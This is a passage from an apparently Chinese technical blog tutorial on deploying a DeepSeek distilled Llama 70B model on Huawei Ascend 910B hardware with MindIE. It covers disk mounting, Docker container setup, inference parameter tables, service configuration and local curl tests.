operator">=</span>                       <span class="token assign-left variable">sunit</span><span class="token operator">=</span><span class="token number">0</span>      <span class="token assign-left variable">swidth</span><span class="token operator">=</span><span class="token number">0</span> blksnaming   <span class="token operator">=</span>version <span class="token number">2</span>              <span class="token assign-left variable">bsize</span><span class="token operator">=</span><span class="token number">4096</span>   ascii-ci<span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">ftype</span><span class="token operator">=</span><span class="token number">1</span>log      <span class="token operator">=</span>internal log           <span class="token assign-left variable">bsize</span><span class="token operator">=</span><span class="token number">4096</span>   <span class="token assign-left variable">blocks</span><span class="token operator">=</span><span class="token number">381544</span>, <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token number">2</span>         <span class="token operator">=</span>                       <span class="token assign-left variable">sectsz</span><span class="token operator">=</span><span class="token number">512</span>   <span class="token assign-left variable">sunit</span><span class="token operator">=</span><span class="token number">0</span> blks, lazy-count<span class="token operator">=</span><span class="token number">1</span>realtime <span class="token operator">=</span>none                   <span class="token assign-left variable">extsz</span><span class="token operator">=</span><span class="token number">4096</span>   <span class="token assign-left variable">blocks</span><span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">rtextents</span><span class="token operator">=</span><span class="token number">0</span>Discarding blocks<span class="token punctuation">..</span>.Done.</code></pre><h4 id="3、查看所有块设备"><a href="#3、查看所有块设备" class="headerlink" title="3、查看所有块设备"></a>3、查看所有块设备</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># lsblk</span>NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda           <span class="token number">8</span>:0    <span class="token number">0</span>  150G  <span class="token number">0</span> disk ├─sda1        <span class="token number">8</span>:1    <span class="token number">0</span>    1G  <span class="token number">0</span> part /boot/efi└─sda2        <span class="token number">8</span>:2    <span class="token number">0</span>  149G  <span class="token number">0</span> part /sdb           <span class="token number">8</span>:16   <span class="token number">0</span>  500G  <span class="token number">0</span> disk nvme0n1     <span class="token number">259</span>:0    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk └─nvme0n1p1 <span class="token number">259</span>:6    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> part nvme4n1     <span class="token number">259</span>:1    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme2n1     <span class="token number">259</span>:2    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme1n1     <span class="token number">259</span>:3    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme3n1     <span class="token number">259</span>:4    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk </code></pre><h4 id="4、查询块设备信息"><a href="#4、查询块设备信息" class="headerlink" title="4、查询块设备信息"></a>4、查询块设备信息</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># blkid</span>/dev/sda2: <span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token string">"fceb329d-eaa2-485b-8507-acb795e6618d"</span> <span class="token assign-left variable">BLOCK_SIZE</span><span class="token operator">=</span><span class="token string">"4096"</span> <span class="token assign-left variable">TYPE</span><span class="token operator">=</span><span class="token string">"ext4"</span> <span class="token assign-left variable">PARTUUID</span><span class="token operator">=</span><span class="token string">"7cc21788-7564-4e9d-9ca5-2c155ca9604e"</span>/dev/sda1: <span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token string">"2A97-A210"</span> <span class="token assign-left variable">BLOCK_SIZE</span><span class="token operator">=</span><span class="token string">"512"</span> <span class="token assign-left variable">TYPE</span><span class="token operator">=</span><span class="token string">"vfat"</span> <span class="token assign-left variable">PARTLABEL</span><span class="token operator">=</span><span class="token string">"EFI System Partition"</span> <span class="token assign-left variable">PARTUUID</span><span class="token operator">=</span><span class="token string">"4aa51ffd-2bc9-44c0-a52b-a106f2722467"</span>/dev/nvme0n1p1: <span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token string">"5f244587-3f94-4e1f-8177-588769947294"</span> <span class="token assign-left variable">BLOCK_SIZE</span><span class="token operator">=</span><span class="token string">"512"</span> <span class="token assign-left variable">TYPE</span><span class="token operator">=</span><span class="token string">"xfs"</span> <span class="token assign-left variable">PARTLABEL</span><span class="token operator">=</span><span class="token string">"primary"</span> <span class="token assign-left variable">PARTUUID</span><span class="token operator">=</span><span class="token string">"423a8955-e5cf-4fa2-97d5-a6dc8cba43ca"</span></code></pre><h4 id="5、挂载硬盘"><a href="#5、挂载硬盘" class="headerlink" title="5、挂载硬盘"></a>5、挂载硬盘</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># mkdir -p /mnt/nvme01</span><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># mount -t xfs /dev/nvme0n1p1 /mnt/nvme01</span></code></pre><h4 id="6、配置开机自动挂载（加一行有关nvme01的配置）"><a href="#6、配置开机自动挂载（加一行有关nvme01的配置）" class="headerlink" title="6、配置开机自动挂载（加一行有关nvme01的配置）"></a>6、配置开机自动挂载（加一行有关nvme01的配置）</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"UUID=<span class="token variable"><span class="token variable">$(</span>blkid <span class="token parameter variable">-s</span> UUID <span class="token parameter variable">-o</span> value /dev/nvme0n1p1<span class="token variable">)</span></span> /mnt/nvme01 xfs defaults 0 0"</span> <span class="token operator">>></span> /etc/fstab</code></pre><p><img src="/images/2025/03/05/413612d2-9d4c-4e02-9a34-677fbe059594.png"></p><h2 id="昇腾社区上申请并获取最新的MindIE镜像安装包："><a href="#昇腾社区上申请并获取最新的MindIE镜像安装包：" class="headerlink" title="昇腾社区上申请并获取最新的MindIE镜像安装包："></a>昇腾社区上申请并获取最新的MindIE镜像安装包：</h2><table><thead><tr><th>镜像介绍</th><th><a href="https://www.hiascend.com/developer/ascendhub/detail/af85b724a7e5469ebd7ea13c3439d48f">https://www.hiascend.com/developer/ascendhub/detail/af85b724a7e5469ebd7ea13c3439d48f</a></th></tr></thead><tbody><tr><td><strong>镜像申请&#x2F;下载</strong></td><td><strong><a href="https://www.hiascend.com/developer/ascendhub/4%E3%80%81detail/af85b724a7e5469ebd7ea13c3439d48f">https://www.hiascend.com/developer/ascendhub/4、detail/af85b724a7e5469ebd7ea13c3439d48f</a></strong></td></tr></tbody></table><h3 id="容器启动脚本docker-start-sh"><a href="#容器启动脚本docker-start-sh" class="headerlink" title="容器启动脚本docker_start.sh"></a>容器启动脚本<code>docker_start.sh</code></h3><pre class="language-none"><code class="language-none">container_name&#x3D;$1image_id&#x3D;$2model_path&#x3D;$3                                                                                                                                                        docker run -it --privileged --name&#x3D;$container_name --net&#x3D;host --shm-size&#x3D;500g\        --device&#x3D;&#x2F;dev&#x2F;davinci_manager \        --device&#x3D;&#x2F;dev&#x2F;devmm_svm \        --device&#x3D;&#x2F;dev&#x2F;hisi_hdc \        -v &#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;driver:&#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;driver \        -v &#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;add-ons&#x2F;:&#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;add-ons&#x2F; \        -v &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;:&#x2F;usr&#x2F;local&#x2F;sbin&#x2F; \        -v &#x2F;var&#x2F;log&#x2F;npu&#x2F;slog&#x2F;:&#x2F;var&#x2F;log&#x2F;npu&#x2F;slog \        -v &#x2F;var&#x2F;log&#x2F;npu&#x2F;profiling&#x2F;:&#x2F;var&#x2F;log&#x2F;npu&#x2F;profiling \-v &#x2F;var&#x2F;log&#x2F;npu&#x2F;dump&#x2F;:&#x2F;var&#x2F;log&#x2F;npu&#x2F;dump \-v &#x2F;var&#x2F;log&#x2F;npu&#x2F;:&#x2F;usr&#x2F;slog \-v &#x2F;etc&#x2F;hccn.conf:&#x2F;etc&#x2F;hccn.conf \-v $model_path:&#x2F;model \$image_id \        &#x2F;bin&#x2F;bash</code></pre><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>–shm-size&#x3D;500g</td><td>可能存在容器中共享内存不足的情况，启动容器时需要添加该参数以配置和host宿主机共享内存。</td></tr><tr><td>–name</td><td>根据需要自行设定。</td></tr><tr><td>–device</td><td>表示映射的设备，可以挂载一个或者多个设备。需要挂载的设备如下：&#x2F;dev&#x2F;davinci_manager：davinci相关的管理设备。&#x2F;dev&#x2F;devmm_svm：内存管理相关设备。&#x2F;dev&#x2F;hisi_hdc：hdc相关管理设备。注：可根据以下命令查询device个数及名称方式，根据需要绑定设备，修改上面命令中的”–device&#x3D;****”。&#96;ll &#x2F;dev&#x2F;</td></tr><tr><td>-v &#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;driver:&#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;driver:ro</td><td>将宿主机目录“&#x2F;usr&#x2F;local&#x2F;Ascend&#x2F;driver ”挂载到容器，请根据驱动所在实际路径修改。</td></tr><tr><td>-v &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;sbin:ro</td><td>挂载容器内需要使用的工具。</td></tr><tr><td>-v &#x2F;path-to-weights:&#x2F;path-to-weights:ro</td><td>挂载宿主机模型权重所在目录。</td></tr></tbody></table><p>如果不使用<code>--priviliged</code>参数，则需要设置各设备，包括设置想要使用的卡号–device，例如下面为8卡：</p><pre class="language-none"><code class="language-none">--name &lt;container-name&gt; \--device&#x3D;&#x2F;dev&#x2F;davinci_manager \--device&#x3D;&#x2F;dev&#x2F;hisi_hdc \--device&#x3D;&#x2F;dev&#x2F;davinci0 \--device&#x3D;&#x2F;dev&#x2F;davinci1 \   --device&#x3D;&#x2F;dev&#x2F;davinci2 \   --device&#x3D;&#x2F;dev&#x2F;davinci3 \  --device&#x3D;&#x2F;dev&#x2F;davinci4 \  --device&#x3D;&#x2F;dev&#x2F;davinci5 \  --device&#x3D;&#x2F;dev&#x2F;davinci6 \--device&#x3D;&#x2F;dev&#x2F;davinci7 \</code></pre><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">container_name</span><span class="token operator">=</span>xxx<span class="token builtin class-name">export</span> <span class="token assign-left variable">image_id</span><span class="token operator">=</span>xxx<span class="token builtin class-name">export</span> <span class="token assign-left variable">model_path</span><span class="token operator">=</span>xxx<span class="token function">bash</span> docker_start.sh <span class="token variable">$container_name</span> <span class="token variable">$image_id</span> <span class="token variable">$model_path</span></code></pre><h2 id="纯模型测试"><a href="#纯模型测试" class="headerlink" title="纯模型测试"></a>纯模型测试</h2><h4 id="1、进入容器"><a href="#1、进入容器" class="headerlink" title="1、进入容器"></a>1、进入容器</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> <span class="token variable">$container_name</span> <span class="token function">bash</span></code></pre><h4 id="2、配置容器环境变量"><a href="#2、配置容器环境变量" class="headerlink" title="2、配置容器环境变量"></a>2、配置容器环境变量</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /usr/local/Ascend/ascend-toolkit/set_env.sh      <span class="token comment"># 配置 cann 环境变量 </span><span class="token builtin class-name">source</span> /usr/local/Ascend/mindie/set_env.sh          <span class="token comment"># 配置 mindie 环境变量 </span><span class="token builtin class-name">source</span> /usr/local/Ascend/nnal/atb/set_env.sh    <span class="token comment"># 配置 atb 算子加速库环境变量 </span><span class="token builtin class-name">source</span> /usr/local/Ascend/atb-models/set_env.sh  <span class="token comment"># 配置 atb-models 代码仓环境变量</span></code></pre><p>进入安装目录：</p><pre class="language-none"><code class="language-none">cd &#123;MindIE安装目录&#125;&#x2F;latest</code></pre><p>确认目录文件权限是否如下所示，若存在不匹配项，则参考以下命令修改权限。</p><pre class="language-none"><code class="language-none">chmod 750 mindie-servicechmod -R 550 mindie-service&#x2F;binchmod -R 500 mindie-service&#x2F;bin&#x2F;mindie_llm_backend_connectorchmod 550 mindie-service&#x2F;libchmod 440 mindie-service&#x2F;lib&#x2F;*chmod 550 mindie-service&#x2F;lib&#x2F;grpcchmod 440 mindie-service&#x2F;lib&#x2F;grpc&#x2F;*chmod -R 550 mindie-service&#x2F;includechmod -R 550 mindie-service&#x2F;scriptschmod 750 mindie-service&#x2F;logschmod 750 mindie-service&#x2F;confchmod 640 mindie-service&#x2F;conf&#x2F;config.jsonchmod 700 mindie-service&#x2F;securitychmod -R 700 mindie-service&#x2F;security&#x2F;*</code></pre><h4 id="3、执行对话测试"><a href="#3、执行对话测试" class="headerlink" title="3、执行对话测试"></a>3、执行对话测试</h4><pre class="language-none"><code class="language-none">torchrun --nproc_per_node 8 \         --master_port 20037 \         -m examples.run_pa \         --model_path $&#123;权重路径&#125; \         --input_texts &#39;What is deep learning?&#39; \         --max_output_length 20</code></pre><h4 id="run-pa-py脚本参数说明"><a href="#run-pa-py脚本参数说明" class="headerlink" title="run_pa.py脚本参数说明"></a><code>run_pa.py</code>脚本参数说明</h4><table><thead><tr><th>参数名称</th><th>是否为必选</th><th>类型</th><th>默认值</th><th>描述</th><th></th></tr></thead><tbody><tr><td>–model_path</td><td>是</td><td>string</td><td>“”</td><td>模型权重路径。该路径会进行安全校验，必须使用绝对路径，且和执行推理用户的属组和权限保持一致。</td><td></td></tr><tr><td>–input_texts</td><td>否</td><td>string</td><td>“What’s deep learning?”</td><td>推理文本或推理文本路径，多条推理文本间使用空格分割。</td><td></td></tr><tr><td>–input_ids</td><td>否</td><td>string</td><td>None</td><td>推理文本经过模型分词器处理后得到的token id列表，多条推理请求间使用空格分割，单个推理请求内每个token使用逗号隔开。</td><td></td></tr><tr><td>–input_file</td><td>否</td><td>string</td><td>None</td><td>仅支持jsonl格式文件，每一行必须为List[Dict]格式的按时间顺序排序的对话数据，每个Dict字典中需要至少包含”role”和”content”两个字段。</td><td></td></tr><tr><td>–input_dict</td><td>否</td><td>parse_list_of_json</td><td>None</td><td>推理文本以及对应的adapter名称。格式形如：’[{“prompt”: “A robe takes 2 bolts of blue fiber and half that much white fiber. How many bolts in total does it take?”, “adapter”: “adapter1”}, {“prompt”: “What is deep learning?”, “adapter”: “base”}]’</td><td></td></tr><tr><td>–max_prefill_batch_size</td><td>否</td><td>int或者None</td><td>None</td><td>模型推理最大Prefill Batch Size。</td><td></td></tr><tr><td>–max_position_embeddings</td><td>否</td><td>int或者None</td><td>None</td><td>模型可接受的最大上下文长度。当此值为None时，则从模型权重文件中读取。</td><td></td></tr><tr><td>–max_input_length</td><td>否</td><td>int</td><td>1024</td><td>推理文本最大token数。</td><td></td></tr><tr><td>–max_output_length</td><td>否</td><td>int</td><td>20</td><td>推理结果最大token数。</td><td></td></tr><tr><td>–max_prefill_tokens</td><td>否</td><td>int</td><td>-1</td><td>模型Prefill推理阶段最大可接受的token数。若输入为-1，则max_prefill_tokens &#x3D; max_batch_size * (max_input_length + max_output_length)</td><td></td></tr><tr><td>–max_batch_size</td><td>否</td><td>int</td><td>1</td><td>模型推理最大batch size。</td><td></td></tr><tr><td>–block_size</td><td>否</td><td>int</td><td>128</td><td>KV Cache分块存储，每块存储的最大token数，默认为128。</td><td></td></tr><tr><td>–chat_template</td><td>否</td><td>string或者None</td><td>None</td><td>对话模型的prompt模板。</td><td></td></tr><tr><td>–ignore_eos</td><td>否</td><td>bool</td><td>store_true</td><td>当推理结果中遇到eos token（句子结束标识符）时，是否结束推理。若传入此参数，则忽略eos token。</td><td></td></tr><tr><td>–is_chat_model</td><td>否</td><td>bool</td><td>store_true</td><td>是否支持对话模式。若传入此参数，则进入对话模式。</td><td></td></tr><tr><td>–is_embedding_model</td><td>否</td><td>bool</td><td>store_true</td><td>是否为embedding类模型。默认为因果推断类模型，若传入此参数，则为embedding类模型。</td><td></td></tr><tr><td>–load_tokenizer</td><td>否</td><td>bool</td><td>True</td><td>是否加载tokenizer。若传入False，则必须传入input_ids参数，且推理输出为token id。</td><td></td></tr><tr><td>–enable_atb_torch</td><td>否</td><td>bool</td><td>store_true</td><td>是否使用Python组图。默认使用C++组图，若传入此参数，则使用Python组图。</td><td></td></tr><tr><td>–kw_args</td><td>否</td><td>string</td><td>“”</td><td>扩展参数，支持用户通过扩展参数进行功能扩展。</td><td></td></tr><tr><td>–trust_remote_code</td><td>否</td><td>bool</td><td>store_true</td><td>是否信任模型权重路径下的自定义代码文件。默认不执行。若传入此参数，则transformers会执行用户权重路径下的自定义代码文件，这些代码文件的功能的安全性需由用户保证，请提前做好安全性检查。</td><td></td></tr></tbody></table><blockquote><p>说明：<br>run_pa.py脚本用于纯模型快速测试，脚本中未增加强校验，出现异常情况时，会直接抛出异常信息。例如：</p><ul><li>input_texts、input_ids、input_file、input_dict参数包含推理内容，程序进行数据处理的时间和传入数据量成正比。同时这些输入会被转换成token id搬运至NPU，传入数据量过大可能会导致这些NPU tensor占用显存过大，而出现由out of memory导致的报错信息，例如：”req: xx input length: xx is too long, max_prefill_tokens: xx”等报错信息。</li><li>chat_template参数可以使用两种形式输入：模板文本或模板文件的路径。当以模板文本输入时，若文本长度过大，可能会导致运行缓慢。</li><li>脚本会基于max_batch_size、max_input_length、max_output_length、max_prefill_batch_size和max_prefill_tokens等参数申请推理输入及KV Cache，若用户传入数值过大，会出现由out of memory导致的报错信息，例如：”RuntimeError: NPU out of memory. Tried to allocate xxx GiB.”。</li><li>脚本会基于max_position_embeddings参数，申请旋转位置编码和attention mask等NPU tensor，若用户传入数值过大，会出现由out of memory导致的报错信息，例如：”RuntimeError: NPU out of memory. Tried to allocate xxx GiB.”。</li><li>block_size参数若小于张量并行场景下每张卡实际分到的注意力头个数，会出现由shape不匹配导致的报错（”Setup fail, enable log: export ASDOPS_LOG_LEVEL&#x3D;ERROR, export ASDOPS_LOG_TO_STDOUT&#x3D;1 to find the first error. For more details, see the MindIE official document.”），需开启日志查看详细信息。</li></ul></blockquote><h4 id="4、性能测试"><a href="#4、性能测试" class="headerlink" title="4、性能测试"></a>4、性能测试</h4><p>进入ModelTest路径</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token variable">$ATB_SPEED_HOME_PATH</span>/tests/modeltest/</code></pre><p>运行测试脚本</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> run.sh pa_<span class="token punctuation">[</span>data_type<span class="token punctuation">]</span> performance <span class="token punctuation">[</span>case_pair<span class="token punctuation">]</span> <span class="token punctuation">[</span>batch_size<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>prefill_batch_size<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>model_name<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>is_chat_model<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>lora <span class="token punctuation">[</span>lora_data_path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>weight_dir<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>trust_remote_code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>chip_num<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>parallel_params<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>max_position_embedding/max_sequence_length<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>具体执行batch&#x3D;1, 输入长度256, 输出长度256用例的8卡并行性能测试命令如下，</p><p>Atlas 800I A2:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> run.sh pa_bf16 performance <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">256,256</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token number">1</span> llama <span class="token variable">$&#123;weight_path&#125;</span> <span class="token number">8</span></code></pre><p>注：ModelTest为大模型的性能和精度提供测试功能。使用文档请参考${ATB_SPEED_HOME_PATH}&#x2F;tests&#x2F;modeltest&#x2F;README.md</p><h2 id="服务化推理"><a href="#服务化推理" class="headerlink" title="服务化推理"></a>服务化推理</h2><p>打开配置文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /usr/local/Ascend/mindie/latest/mindie-service/conf/config.json</code></pre><p>修改配置文件，<code>config.json</code>参考配置如下：<br><a href="https://www.hiascend.com/document/detail/zh/mindie/100/mindieservice/servicedev/mindie_service0285.html">配置参数说明</a></p><pre class="language-none"><code class="language-none">&#123;    &quot;Version&quot;: &quot;1.0.0&quot;,    &quot;LogConfig&quot; :    &#123;        &quot;logLevel&quot; : &quot;Info&quot;,        &quot;logFileSize&quot; : 20,        &quot;logFileNum&quot; : 20,        &quot;logPath&quot; : &quot;logs&#x2F;mindservice.log&quot;    &#125;,    &quot;ServerConfig&quot; :    &#123;        &quot;ipAddress&quot; : &quot;127.0.0.1&quot;,        &quot;managementIpAddress&quot;: &quot;127.0.0.2&quot;,        &quot;port&quot; : 1025,        &quot;managementPort&quot; : 1026,        &quot;metricsPort&quot; : 1027,        &quot;allowAllZeroIpListening&quot; : false,        &quot;maxLinkNum&quot; : 1000,        &quot;httpsEnabled&quot; : true,        &quot;fullTextEnabled&quot; : false,        &quot;tlsCaPath&quot; : &quot;security&#x2F;ca&#x2F;&quot;,        &quot;tlsCaFile&quot; : [&quot;ca.pem&quot;],        &quot;tlsCert&quot; : &quot;security&#x2F;certs&#x2F;server.pem&quot;,        &quot;tlsPk&quot; : &quot;security&#x2F;keys&#x2F;server.key.pem&quot;,        &quot;tlsPkPwd&quot; : &quot;security&#x2F;pass&#x2F;key_pwd.txt&quot;,        &quot;tlsCrlPath&quot; : &quot;security&#x2F;certs&#x2F;&quot;,        &quot;tlsCrlFiles&quot; : [&quot;server_crl.pem&quot;],        &quot;managementTlsCaFile&quot; : [&quot;management_ca.pem&quot;],        &quot;managementTlsCert&quot; : &quot;security&#x2F;certs&#x2F;management&#x2F;server.pem&quot;,        &quot;managementTlsPk&quot; : &quot;security&#x2F;keys&#x2F;management&#x2F;server.key.pem&quot;,        &quot;managementTlsPkPwd&quot; : &quot;security&#x2F;pass&#x2F;management&#x2F;key_pwd.txt&quot;,        &quot;managementTlsCrlPath&quot; : &quot;security&#x2F;management&#x2F;certs&#x2F;&quot;,        &quot;managementTlsCrlFiles&quot; : [&quot;server_crl.pem&quot;],        &quot;kmcKsfMaster&quot; : &quot;tools&#x2F;pmt&#x2F;master&#x2F;ksfa&quot;,        &quot;kmcKsfStandby&quot; : &quot;tools&#x2F;pmt&#x2F;standby&#x2F;ksfb&quot;,        &quot;inferMode&quot; : &quot;standard&quot;,        &quot;interCommTLSEnabled&quot; : true,        &quot;interCommPort&quot; : 1121,        &quot;interCommTlsCaPath&quot; : &quot;security&#x2F;grpc&#x2F;ca&#x2F;&quot;,        &quot;interCommTlsCaFiles&quot; : [&quot;ca.pem&quot;],        &quot;interCommTlsCert&quot; : &quot;security&#x2F;grpc&#x2F;certs&#x2F;server.pem&quot;,        &quot;interCommPk&quot; : &quot;security&#x2F;grpc&#x2F;keys&#x2F;server.key.pem&quot;,        &quot;interCommPkPwd&quot; : &quot;security&#x2F;grpc&#x2F;pass&#x2F;key_pwd.txt&quot;,        &quot;interCommTlsCrlPath&quot; : &quot;security&#x2F;grpc&#x2F;certs&#x2F;&quot;,        &quot;interCommTlsCrlFiles&quot; : [&quot;server_crl.pem&quot;],        &quot;openAiSupport&quot; : &quot;vllm&quot;    &#125;,    &quot;BackendConfig&quot;: &#123;        &quot;backendName&quot; : &quot;mindieservice_llm_engine&quot;,        &quot;modelInstanceNumber&quot; : 1,        &quot;npuDeviceIds&quot; : [[0,1,2,3]],        &quot;tokenizerProcessNumber&quot; : 8,        &quot;multiNodesInferEnabled&quot;: false,        &quot;multiNodesInferPort&quot;: 1120,        &quot;interNodeTLSEnabled&quot;: true,        &quot;interNodeTlsCaPath&quot;: &quot;security&#x2F;grpc&#x2F;ca&#x2F;&quot;,        &quot;interNodeTlsCaFiles&quot;: [&quot;ca.pem&quot;],        &quot;interNodeTlsCert&quot;: &quot;security&#x2F;grpc&#x2F;certs&#x2F;server.pem&quot;,        &quot;interNodeTlsPk&quot;: &quot;security&#x2F;grpc&#x2F;keys&#x2F;server.key.pem&quot;,        &quot;interNodeTlsPkPwd&quot;: &quot;security&#x2F;grpc&#x2F;pass&#x2F;mindie_server_key_pwd.txt&quot;,        &quot;interNodeTlsCrlPath&quot; : &quot;security&#x2F;grpc&#x2F;certs&#x2F;&quot;,        &quot;interNodeTlsCrlfiles&quot; : [&quot;server_crl.pem&quot;],        &quot;interNodeKmcKsfMaster&quot;: &quot;tools&#x2F;pmt&#x2F;master&#x2F;ksfa&quot;,        &quot;interNodeKmcKsfStandby&quot;: &quot;tools&#x2F;pmt&#x2F;standby&#x2F;ksfb&quot;,        &quot;ModelDeployConfig&quot;:        &#123;            &quot;maxSeqLen&quot; : 2560,            &quot;maxInputTokenLen&quot; : 2048,            &quot;truncation&quot; : false,            &quot;ModelConfig&quot; : [                &#123;                    &quot;modelInstanceType&quot;: &quot;Standard&quot;,                    &quot;modelName&quot; : &quot;DeepSeek-R1-Distill-Llama-70B&quot;,                    &quot;modelWeightPath&quot; : &quot;&#x2F;data&#x2F;atb_testdata&#x2F;weights&#x2F;llama1-65b-safetensors&quot;,                    &quot;worldSize&quot; : 4,                    &quot;cpuMemSize&quot; : 5,                    &quot;npuMemSize&quot; : -1,                    &quot;backendType&quot;: &quot;atb&quot;,                    &quot;trustRemoteCode&quot;: false                &#125;            ]        &#125;,        &quot;ScheduleConfig&quot;:        &#123;            &quot;templateType&quot;: &quot;Standard&quot;,            &quot;templateName&quot; : &quot;Standard_LLM&quot;,            &quot;cacheBlockSize&quot; : 128,            &quot;maxPrefillBatchSize&quot; : 50,            &quot;maxPrefillTokens&quot; : 8192,            &quot;prefillTimeMsPerReq&quot; : 150,            &quot;prefillPolicyType&quot; : 0,            &quot;decodeTimeMsPerReq&quot; : 50,            &quot;decodePolicyType&quot; : 0,            &quot;maxBatchSize&quot; : 200,            &quot;maxIterTimes&quot; : 512,            &quot;maxPreemptCount&quot; : 0,            &quot;supportSelectBatch&quot; : false,            &quot;maxQueueDelayMicroseconds&quot; : 5000        &#125;    &#125;&#125;</code></pre><p>启动服务。启动命令需在&#x2F;{MindIE安装目录}&#x2F;latest&#x2F;mindie-service目录中执行。</p><p>（推荐）使用后台进程方式启动服务。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> ./bin/mindieservice_daemon <span class="token operator">></span> output.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> <span class="token parameter variable">-f</span> output.log</code></pre><p>在标准输出流捕获到的文件中，打印如下信息说明启动成功。</p><pre class="language-none"><code class="language-none">Daemon start success!</code></pre><p>直接启动服务。</p><pre class="language-bash" data-language="bash"><code class="language-bash">./bin/mindieservice_daemon</code></pre><p>回显如下则说明启动成功。</p><pre class="language-none"><code class="language-none">Daemon start success!</code></pre><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>目前 MindIE-Service 的 API 接口兼容 <a href="https://platform.openai.com/docs/guides/text-generation">OpenAI</a>、 <a href="https://docs.vllm.ai/en/latest/getting_started/examples/api_client.html">vLLM</a>、<a href="https://huggingface.github.io/text-generation-inference/">HuggingFace Text Generation Inference</a> 、<a href="https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/protocol/extension_generate.html">NVIDIA Triton Inference Server</a> 推理框架。<br>OpenAI: <code>/v1/chat/completions</code><br>vLLM: <code>/generate</code><br>HuggingFace TGI: <code>/generate</code>、<code>/generate_stream</code><br>NVIDIA Triton Inference Server：<br><code>/v2/models/$&#123;MODEL_NAME&#125;[/versions/$&#123;MODEL_VERSION&#125;]/infer</code><br><code>v2/models/$&#123;MODEL_NME&#125;[/versions/$&#123;MODEL_VERSION&#125;]/generate</code><br><code>v2/models/$&#123;MODEL_NAME&#125;[/versions/$&#123;MODEL_VERSION&#125;]/generate_stream</code></p><p>新建窗口测试(VLLM接口)</p><pre class="language-none"><code class="language-none">curl 127.0.0.1:1025&#x2F;generate -d &#39;&#123;&quot;prompt&quot;: &quot;西红柿炒鸡蛋怎么做?&quot;,&quot;max_tokens&quot;: 128,&quot;stream&quot;: false,&quot;do_sample&quot;:true,&quot;repetition_penalty&quot;: 1.00,&quot;temperature&quot;: 0.01,&quot;top_p&quot;: 0.001,&quot;top_k&quot;: 1,&quot;model&quot;: &quot;DeepSeek-R1-Distill-Llama-70B&quot;&#125;&#39;</code></pre><p>OpenAI格式接口</p><pre class="language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;127.0.0.1:1025&#x2F;v1&#x2F;chat&#x2F;completions&quot; \  -H &quot;Content-Type: application&#x2F;json&quot; \  -d &#39;&#123;    &quot;model&quot;: &quot;DeepSeek-R1-Distill-Llama-70B&quot;,    &quot;messages&quot;: [      &#123;        &quot;role&quot;: &quot;user&quot;,        &quot;content&quot;: &quot;西红柿炒鸡蛋怎么做？&quot;      